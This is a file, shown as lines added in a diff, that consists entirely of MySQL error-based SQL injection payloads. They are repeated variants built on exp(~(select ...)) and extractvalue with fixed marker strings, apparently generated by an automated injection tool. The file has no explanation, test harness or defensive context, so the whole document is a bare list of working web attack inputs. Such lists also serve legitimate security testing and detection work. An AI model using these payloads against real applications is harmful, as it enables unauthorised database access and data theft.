@@ -1,0 +1,500 @@
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   -- dkwz
+1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
+1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj
